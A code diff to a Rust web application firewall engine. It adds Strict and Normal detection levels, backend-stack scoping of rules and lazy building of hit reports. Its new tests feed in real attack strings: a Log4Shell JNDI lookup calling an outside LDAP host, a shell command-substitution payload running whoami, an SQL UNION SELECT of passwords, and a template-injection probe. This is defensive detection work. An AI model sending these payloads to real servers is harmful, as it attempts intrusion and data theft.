@@ -20,13 +20,17 @@ use std::str::FromStr;
 
 use serde::{Deserialize, Serialize};
 
+use crate::normalize::ValueSource;
 use crate::normalize::{normalize_request, NormalizedRequest};
 use crate::rules::expression::{evaluate, EvalContext};
 use crate::rules::managed::default_managed_rules;
-use crate::rules::signatures::{detect_sqli, detect_xss, SignatureEngine};
+use crate::rules::signatures::{
+    detect_expr_injection, detect_sqli, detect_xss, AttackCategory,
+    SignatureEngine, SignatureHit,
+};
 use crate::rules::{CompiledRule, RuleAction};
 use crate::score::{AnomalyScorer, ScoreBreakdown, ScoreClass};
-use crate::{WafAction, WafVerdict};
+use crate::{StackSet, WafAction, WafLevel, WafVerdict};
 
 /// Operating mode for the engine.
 #[derive(
@@ -48,6 +52,16 @@ pub enum WafMode {
 #[derive(Debug, Clone)]
 pub struct WafEngineConfig {
     pub mode: WafMode,
+    /// Detection level. Normal keeps the low-false-positive defaults;
+    /// Strict enables the escape-decoding pass, structural EL/SSTI
+    /// detection, Strict-only needles and rules, tightened sub-score gates
+    /// and paranoia-level-3 rules.
+    pub level: WafLevel,
+    /// Backend stacks deployed behind this engine. `GENERIC` patterns and
+    /// rules are always active; language-scoped ones (Java deserialization,
+    /// PHP unserialize, …) load only when their stack is listed. Defaults to
+    /// every stack so unconfigured deployments keep full coverage.
+    pub stacks: StackSet,
     /// Aggregate-score block threshold (default 40).
     pub threshold: u32,
     /// 1 (loose) … 4 (paranoid).
@@ -67,6 +81,8 @@ impl Default for WafEngineConfig {
     fn default() -> Self {
         Self {
             mode: WafMode::Block,
+            level: WafLevel::Normal,
+            stacks: StackSet::ALL,
             threshold: 40,
             paranoia_level: 2,
             max_decode_layers: 3,
@@ -112,6 +128,44 @@ impl RequestData {
     }
 }
 
+/// Deferred Stage-1 hit record. Scoring happens inline while the value is
+/// hot, but the human-readable strings are only materialized when the verdict
+/// turns out to be something other than a clean pass — the overwhelmingly
+/// common case pays zero formatting cost.
+enum HitRec<'a> {
+    /// Aho-Corasick signature hit; metadata resolved through the engine's
+    /// pattern table at string-build time.
+    Sig {
+        pattern: u32,
+        severity: u8,
+        source: &'static str,
+        name: &'a str,
+    },
+    /// libinjection-style detector hit. The severity is applied to the
+    /// scorer inline; the record only carries what string-building needs.
+    Lib {
+        kind: &'static str,
+        fingerprint: String,
+        source: &'static str,
+        name: &'a str,
+    },
+    /// Structural expression-injection hit (Strict level only).
+    Expr {
+        container: &'static str,
+        source: &'static str,
+        name: &'a str,
+    },
+}
+
+/// A Stage-2 rule match, recorded by reference and stringified only when the
+/// verdict needs details.
+struct RuleRec<'a> {
+    id: &'a str,
+    name: &'a str,
+    action: RuleAction,
+    severity: u8,
+}
+
 /// Multi-stage WAF detection engine. Clone is intentionally not derived —
 /// share an `Arc<WafEngine>` instead so the Aho-Corasick automaton stays put.
 pub struct WafEngine {
@@ -119,6 +173,8 @@ pub struct WafEngine {
     rules: Vec<CompiledRule>,
     scorer: AnomalyScorer,
     mode: WafMode,
+    level: WafLevel,
+    stacks: StackSet,
     max_decode_layers: usize,
     fast_path_block_on_critical: bool,
 }
@@ -127,6 +183,8 @@ impl std::fmt::Debug for WafEngine {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         f.debug_struct("WafEngine")
             .field("mode", &self.mode)
+            .field("level", &self.level)
+            .field("stacks", &self.stacks.bits())
             .field("rule_count", &self.rules.len())
             .field("signature_count", &self.signatures.pattern_count())
             .field("scorer", &self.scorer)
@@ -144,17 +202,33 @@ impl WafEngine {
     pub fn new(config: &WafEngineConfig) -> Self {
         let mut rules = Vec::with_capacity(config.rules.len() + 16);
         if config.enable_managed_rules {
-            rules.extend(default_managed_rules());
+            rules.extend(default_managed_rules(config.level));
         }
         rules.extend(config.rules.iter().cloned());
 
         Self {
-            signatures: SignatureEngine::new(),
+            signatures: SignatureEngine::for_profile(
+                config.level,
+                config.stacks,
+            ),
             rules,
             scorer: AnomalyScorer::new(config.threshold, config.paranoia_level),
             mode: config.mode,
+            level: config.level,
+            stacks: config.stacks,
             max_decode_layers: config.max_decode_layers.clamp(1, 5),
             fast_path_block_on_critical: config.fast_path_block_on_critical,
+        }
+    }
+
+    /// Paranoia level actually used for rule gating. The Strict level implies
+    /// at least PL3, so the size/empty-UA rules activate without the operator
+    /// having to touch the knob.
+    fn effective_paranoia(&self) -> u8 {
+        if self.level.is_strict() {
+            self.scorer.paranoia_level.max(3)
+        } else {
+            self.scorer.paranoia_level
         }
     }
 
@@ -198,16 +272,22 @@ impl WafEngine {
     ///
     /// Pipeline:
     /// 1. Normalize the request (URL multi-decode, HTML entity decode, path
-    ///    collapse, query/cookie split).
+    ///    collapse, query/cookie split; escape-sequence decoding at Strict).
     /// 2. Stage 1 — Aho-Corasick signature scan + libinjection SQLi/XSS over
-    ///    every decoded value. Each hit feeds the anomaly scorer.
-    /// 3. If `fast_path_block_on_critical` and a severity-5 hit landed,
+    ///    every decoded value. Each hit feeds the anomaly scorer. Referer /
+    ///    User-Agent hits in the reflected families (SQLi / XSS / RCE) are
+    ///    demoted to weak signals; the Strict level promotes the
+    ///    high-confidence injection families to critical and adds structural
+    ///    expression-injection detection.
+    /// 3. If `fast_path_block_on_critical` and a critical hit landed,
     ///    short-circuit to a Block verdict without running Stage 2.
     /// 4. Stage 2 — evaluate compiled rules against an [`EvalContext`] that
     ///    already exposes the Stage-1 sub-scores. Allow actions short-circuit
     ///    the rest of the rule set.
     /// 5. Combine the aggregate score with the engine threshold and mode to
-    ///    pick the final action.
+    ///    pick the final action. Hit strings are only materialized when the
+    ///    verdict is something other than a clean pass, so the happy path
+    ///    pays zero formatting cost.
     pub fn inspect(&self, request: &RequestData) -> WafVerdict {
         if self.mode == WafMode::Off {
             return WafVerdict::pass();
@@ -220,12 +300,18 @@ impl WafEngine {
             &request.headers,
             request.body.as_deref(),
             self.max_decode_layers,
+            self.level.is_strict(),
         );
+        let paranoia = self.effective_paranoia();
 
         let mut breakdown = ScoreBreakdown::clean();
-        let mut matched: Vec<String> = Vec::new();
-        let mut details: Vec<String> = Vec::new();
+        let mut recs: Vec<HitRec> = Vec::new();
         let mut critical_hit = false;
+
+        // Reused scan buffers: a full request costs one allocation here
+        // instead of one per inspected value.
+        let mut hits: Vec<SignatureHit> = Vec::new();
+        let mut seen: Vec<u32> = Vec::new();
 
         // ----- Stage 1: signatures + libinjection over every decoded value -----
         for value in &normalized.decoded_values {
@@ -233,24 +319,58 @@ impl WafEngine {
             if needle.is_empty() {
                 continue;
             }
-            for hit in self.signatures.scan(needle) {
-                if hit.severity >= 5 {
+            // Reflected display metadata (Referer / User-Agent) is not an
+            // execution surface the way query/body/cookie values are: real
+            // SQLi lands in fields the backend feeds to an interpreter,
+            // while a Referer quoting "union select" is overwhelmingly
+            // search-result noise. Demote those two headers to weak signals
+            // for the reflected families — structural backend-parsing
+            // families (Log4Shell, XXE, deserialization) keep full severity
+            // because a JVM parses *every* header it receives.
+            let is_meta_header = value.source == ValueSource::Header
+                && (value.name.eq_ignore_ascii_case("referer")
+                    || value.name.eq_ignore_ascii_case("user-agent"));
+
+            self.signatures.scan_into(needle, &mut hits, &mut seen);
+            for hit in &hits {
+                let mut severity = hit.severity;
+                let mut critical = severity >= 5;
+                if is_meta_header
+                    && matches!(
+                        hit.category,
+                        AttackCategory::SqlInjection
+                            | AttackCategory::Xss
+                            | AttackCategory::CommandInjection
+                    )
+                {
+                    severity = 2;
+                    critical = false;
+                } else if self.level.is_strict()
+                    && matches!(
+                        hit.category,
+                        AttackCategory::CrlfInjection
+                            | AttackCategory::CommandInjection
+                            | AttackCategory::Deserialization
+                    )
+                {
+                    // High-confidence injection families block outright at
+                    // the Strict level instead of waiting for the scorer.
+                    critical = true;
+                }
+                if critical {
                     critical_hit = true;
                 }
                 self.scorer.add_category_hit(
                     &mut breakdown,
                     hit.category,
-                    hit.severity,
+                    severity,
                 );
-                matched.push(hit.pattern_id.clone());
-                details.push(format!(
-                    "{} [{} sev={}] in {} '{}'",
-                    hit.pattern_id,
-                    hit.category,
-                    hit.severity,
-                    value.source.as_str(),
-                    value.name
-                ));
+                recs.push(HitRec::Sig {
+                    pattern: hit.pattern,
+                    severity,
+                    source: value.source.as_str(),
+                    name: &value.name,
+                });
             }
 
             // libinjection-style detectors on user-controlled values only.
@@ -258,52 +378,88 @@ impl WafEngine {
             // way query / body / cookie values are.
             if !matches!(
                 value.source,
-                crate::normalize::ValueSource::QueryParam
-                    | crate::normalize::ValueSource::Cookie
-                    | crate::normalize::ValueSource::Body
-                    | crate::normalize::ValueSource::Header
+                ValueSource::QueryParam
+                    | ValueSource::Cookie
+                    | ValueSource::Body
+                    | ValueSource::Header
             ) {
                 continue;
             }
             let (is_sqli, sqli_fp) = detect_sqli(needle);
             if is_sqli {
-                // Treat a libinjection hit as severity 5 (critical).
-                critical_hit = true;
+                let (severity, critical) = if is_meta_header {
+                    (2, false)
+                } else {
+                    (5, true)
+                };
+                if critical {
+                    critical_hit = true;
+                }
                 self.scorer.add_category_hit(
                     &mut breakdown,
-                    crate::rules::signatures::AttackCategory::SqlInjection,
-                    5,
+                    AttackCategory::SqlInjection,
+                    severity,
                 );
-                matched.push("LIBINJ-SQLI".to_string());
-                details.push(format!(
-                    "libinjection-sqli [{}] in {} '{}'",
-                    sqli_fp,
-                    value.source.as_str(),
-                    value.name
-                ));
+                recs.push(HitRec::Lib {
+                    kind: "libinjection-sqli",
+                    fingerprint: sqli_fp,
+                    source: value.source.as_str(),
+                    name: &value.name,
+                });
             }
             let (is_xss, xss_fp) = detect_xss(needle);
             if is_xss {
-                critical_hit = true;
+                let (severity, critical) = if is_meta_header {
+                    (2, false)
+                } else {
+                    (5, true)
+                };
+                if critical {
+                    critical_hit = true;
+                }
                 self.scorer.add_category_hit(
                     &mut breakdown,
-                    crate::rules::signatures::AttackCategory::Xss,
-                    5,
+                    AttackCategory::Xss,
+                    severity,
                 );
-                matched.push("LIBINJ-XSS".to_string());
-                details.push(format!(
-                    "libinjection-xss [{}] in {} '{}'",
-                    xss_fp,
-                    value.source.as_str(),
-                    value.name
-                ));
+                recs.push(HitRec::Lib {
+                    kind: "libinjection-xss",
+                    fingerprint: xss_fp,
+                    source: value.source.as_str(),
+                    name: &value.name,
+                });
+            }
+
+            // Strict level: structural EL / SSTI detection over the decoded
+            // value. A container with interpreter-facing shape is treated as
+            // a critical hit; Normal only scores template openers.
+            if self.level.is_strict() {
+                if let Some(container) = detect_expr_injection(needle) {
+                    self.scorer.add_expr_hit(&mut breakdown);
+                    critical_hit = true;
+                    recs.push(HitRec::Expr {
+                        container,
+                        source: value.source.as_str(),
+                        name: &value.name,
+                    });
+                }
             }
         }
 
         // Also scan the normalized path itself — traversal patterns commonly
         // appear after `..` resolution rather than in raw query params.
-        for hit in self.signatures.scan(&normalized.path) {
-            if hit.severity >= 5 {
+        self.signatures
+            .scan_into(&normalized.path, &mut hits, &mut seen);
+        for hit in &hits {
+            let critical = hit.severity >= 5
+                || (self.level.is_strict()
+                    && matches!(
+                        hit.category,
+                        AttackCategory::CrlfInjection
+                            | AttackCategory::CommandInjection
+                            | AttackCategory::Deserialization
+                    ));
+            if critical {
                 critical_hit = true;
             }
             self.scorer.add_category_hit(
@@ -311,13 +467,12 @@ impl WafEngine {
                 hit.category,
                 hit.severity,
             );
-            if !matched.contains(&hit.pattern_id) {
-                matched.push(hit.pattern_id.clone());
-            }
-            details.push(format!(
-                "{} [{} sev={}] in path",
-                hit.pattern_id, hit.category, hit.severity
-            ));
+            recs.push(HitRec::Sig {
+                pattern: hit.pattern,
+                severity: hit.severity,
+                source: "path",
+                name: "",
+            });
         }
 
         // ----- Build evaluation context (snapshot of Stage-1 scores) -----
@@ -329,8 +484,8 @@ impl WafEngine {
             full_uri: &normalized.full_uri,
             host: normalized.host(),
             user_agent: normalized.user_agent(),
-            body: normalized.body_str.as_deref(),
-            headers: &normalized.headers,
+            body: normalized.body_str(),
+            headers: normalized.headers,
             cookies: &normalized.cookies,
             client_ip: &request.client_ip,
             parsed_ip,
@@ -339,6 +494,7 @@ impl WafEngine {
             waf_score: breakdown.total,
             waf_score_sqli: breakdown.sqli_score,
             waf_score_xss: breakdown.xss_score,
+            waf_score_rce: breakdown.rce_score,
         };
 
         // ----- Allow pre-pass -----
@@ -349,12 +505,15 @@ impl WafEngine {
             if !rule.enabled || rule.action != RuleAction::Allow {
                 continue;
             }
-            if rule.paranoia_level > self.scorer.paranoia_level {
+            if rule.paranoia_level > paranoia
+                || !self.stacks.contains(rule.stacks)
+            {
                 continue;
             }
             if !evaluate(&rule.expression, &ctx) {
                 continue;
             }
+            let mut matched = self.matched_from(&recs, &[]);
             matched.push(rule.id.clone());
             return WafVerdict {
                 action: WafAction::Pass,
@@ -372,33 +531,34 @@ impl WafEngine {
         if self.fast_path_block_on_critical && critical_hit {
             return self.finalize_verdict(
                 &mut breakdown,
-                matched,
-                details,
+                self.matched_from(&recs, &[]),
+                self.details_from(&recs, &[]),
                 Some(WafAction::Block),
                 "stage1-critical",
             );
         }
 
         // ----- Stage 2: rule engine (non-Allow rules) -----
+        let mut rule_recs: Vec<RuleRec> = Vec::new();
         let mut forced_action: Option<WafAction> = None;
         for rule in &self.rules {
             if !rule.enabled || rule.action == RuleAction::Allow {
                 continue;
             }
-            if rule.paranoia_level > self.scorer.paranoia_level {
+            if rule.paranoia_level > paranoia
+                || !self.stacks.contains(rule.stacks)
+            {
                 continue;
             }
             if !evaluate(&rule.expression, &ctx) {
                 continue;
             }
-            matched.push(rule.id.clone());
-            details.push(format!(
-                "{} [{}] action={} sev={}",
-                rule.id,
-                rule.name,
-                rule.action.as_str(),
-                rule.severity
-            ));
+            rule_recs.push(RuleRec {
+                id: &rule.id,
+                name: &rule.name,
+                action: rule.action,
+                severity: rule.severity,
+            });
             match rule.action {
                 RuleAction::Allow => {
                     unreachable!("allow rules handled in pre-pass")
@@ -433,6 +593,14 @@ impl WafEngine {
             WafAction::Pass
         };
 
+        // A clean pass never materializes hit strings — zero formatting
+        // cost on the happy path. `Pass` can only be reached when nothing
+        // fired anywhere (any hit or Log rule would have raised the score).
+        if action == WafAction::Pass {
+            debug_assert!(recs.is_empty() && rule_recs.is_empty());
+            return WafVerdict::pass();
+        }
+
         let reason = match breakdown.overall_class {
             ScoreClass::Clean => "clean",
             ScoreClass::LikelyClean => "likely-clean",
@@ -441,11 +609,89 @@ impl WafEngine {
         };
         self.finalize_verdict(
             &mut breakdown,
-            matched,
-            details,
+            self.matched_from(&recs, &rule_recs),
+            self.details_from(&recs, &rule_recs),
             Some(action),
             reason,
         )
+    }
+
+    /// Rule identifiers for every recorded hit, in first-seen order.
+    fn matched_from(
+        &self,
+        recs: &[HitRec<'_>],
+        rules: &[RuleRec<'_>],
+    ) -> Vec<String> {
+        let mut matched = Vec::with_capacity(recs.len() + rules.len());
+        for rec in recs {
+            match rec {
+                HitRec::Sig { pattern, .. } => matched
+                    .push(self.signatures.pattern_id(*pattern).to_string()),
+                HitRec::Lib { kind, .. } => matched.push(kind.to_string()),
+                HitRec::Expr { .. } => matched.push("EXPR-INJ".to_string()),
+            }
+        }
+        for rule in rules {
+            matched.push(rule.id.to_string());
+        }
+        matched
+    }
+
+    /// Human-readable explanation for every recorded hit.
+    fn details_from(
+        &self,
+        recs: &[HitRec<'_>],
+        rules: &[RuleRec<'_>],
+    ) -> Vec<String> {
+        let mut details = Vec::with_capacity(recs.len() + rules.len());
+        for rec in recs {
+            match rec {
+                HitRec::Sig {
+                    pattern,
+                    severity,
+                    source,
+                    name,
+                } => {
+                    let p = self.signatures.pattern(*pattern);
+                    details.push(format!(
+                        "{} [{} sev={}] in {} '{}'",
+                        p.id, p.category, severity, source, name
+                    ));
+                },
+                HitRec::Lib {
+                    kind,
+                    fingerprint,
+                    source,
+                    name,
+                    ..
+                } => {
+                    details.push(format!(
+                        "{} [{}] in {} '{}'",
+                        kind, fingerprint, source, name
+                    ));
+                },
+                HitRec::Expr {
+                    container,
+                    source,
+                    name,
+                } => {
+                    details.push(format!(
+                        "expr-injection [{}] in {} '{}'",
+                        container, source, name
+                    ));
+                },
+            }
+        }
+        for rule in rules {
+            details.push(format!(
+                "{} [{}] action={} sev={}",
+                rule.id,
+                rule.name,
+                rule.action.as_str(),
+                rule.severity
+            ));
+        }
+        details
     }
 
     fn finalize_verdict(
@@ -486,7 +732,10 @@ impl WafEngine {
 
     /// Expose the normalized view of a request — handy for tests and for
     /// upstream code that wants to log what the WAF actually saw.
-    pub fn normalize(&self, request: &RequestData) -> NormalizedRequest {
+    pub fn normalize<'a>(
+        &self,
+        request: &'a RequestData,
+    ) -> NormalizedRequest<'a> {
         normalize_request(
             &request.method,
             &request.path,
@@ -494,6 +743,7 @@ impl WafEngine {
             &request.headers,
             request.body.as_deref(),
             self.max_decode_layers,
+            self.level.is_strict(),
         )
     }
 }
@@ -761,5 +1011,129 @@ mod tests {
         assert!(v.breakdown.total > 0);
         assert!(v.breakdown.sqli_score > 0);
         assert!(!matches!(v.breakdown.overall_class, ScoreClass::Clean));
+    }
+
+    fn strict_engine() -> WafEngine {
+        WafEngine::new(&WafEngineConfig {
+            level: WafLevel::Strict,
+            ..Default::default()
+        })
+    }
+
+    #[test]
+    fn blocks_log4shell_in_query() {
+        // Regression guard: the benchmark showed this payload shape slipping
+        // through, so pin the full-pipeline behavior.
+        let e = engine();
+        let v = e.inspect(&req(
+            "GET",
+            "/solr/admin/cores",
+            "action=${jndi:ldap://${sys:java.version}.example.com}",
+        ));
+        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
+    }
+
+    #[test]
+    fn referer_sqli_is_not_blocked_in_normal() {
+        // A Referer quoting an SQL payload is search-result noise, not an
+        // injection attempt — it must score, not block.
+        let e = engine();
+        let mut r = req("GET", "/article", "id=1");
+        r.headers.push((
+            "Referer".into(),
+            "https://google.com/search?q=1' UNION SELECT password FROM users --"
+                .into(),
+        ));
+        let v = e.inspect(&r);
+        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
+        assert!(matches!(v.action, WafAction::Pass | WafAction::Monitor));
+    }
+
+    #[test]
+    fn strict_blocks_rce_command_substitution() {
+        let e = strict_engine();
+        let v = e.inspect(&req(
+            "GET",
+            "/login/index.php",
+            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
+        ));
+        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
+    }
+
+    #[test]
+    fn normal_scores_rce_without_blocking() {
+        let e = engine();
+        let v = e.inspect(&req(
+            "GET",
+            "/login/index.php",
+            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
+        ));
+        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
+        assert!(v.score > 0);
+    }
+
+    #[test]
+    fn strict_blocks_structural_ssti() {
+        let e = strict_engine();
+        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
+        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
+    }
+
+    #[test]
+    fn normal_does_not_block_structural_ssti() {
+        let e = engine();
+        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
+        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
+        assert!(v.score > 0);
+    }
+
+    #[test]
+    fn strict_activates_paranoia_level_3_rules() {
+        let e = strict_engine();
+        // 1051 (very long URI) is a PL3 rule; the strict engine's effective
+        // paranoia is at least 3, so it fires without extra configuration.
+        let long = "x".repeat(5000);
+        let v = e.inspect(&req("GET", &format!("/{long}"), ""));
+        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
+        assert!(v.matched_rules.iter().any(|m| m == "PINGWAF-1051"));
+    }
+
+    #[test]
+    fn stack_scoped_rules_respect_configured_stacks() {
+        // A Java-scoped custom rule must be inactive for an engine built
+        // without the Java stack, and active once it is configured.
+        let make_rule = || {
+            let mut r = CompiledRule::compile(
+                "JAVA-ONLY",
+                "java-scoped test rule",
+                r#"user_agent contains "ozilla""#,
+                RuleAction::Block,
+                5,
+                vec![],
+            )
+            .unwrap();
+            r.stacks = StackSet::JAVA;
+            r
+        };
+        let without_java = WafEngine::new(&WafEngineConfig {
+            mode: WafMode::Monitor,
+            stacks: StackSet::GENERIC,
+            rules: vec![make_rule()],
+            ..Default::default()
+        });
+        let v = without_java.inspect(&req("GET", "/", ""));
+        assert!(
+            !v.matched_rules.contains(&"JAVA-ONLY".to_string()),
+            "java-scoped rule must be inactive without the java stack"
+        );
+
+        let with_java = WafEngine::new(&WafEngineConfig {
+            mode: WafMode::Monitor,
+            stacks: StackSet::GENERIC.union(StackSet::JAVA),
+            rules: vec![make_rule()],
+            ..Default::default()
+        });
+        let v = with_java.inspect(&req("GET", "/", ""));
+        assert!(v.matched_rules.contains(&"JAVA-ONLY".to_string()));
     }
 }
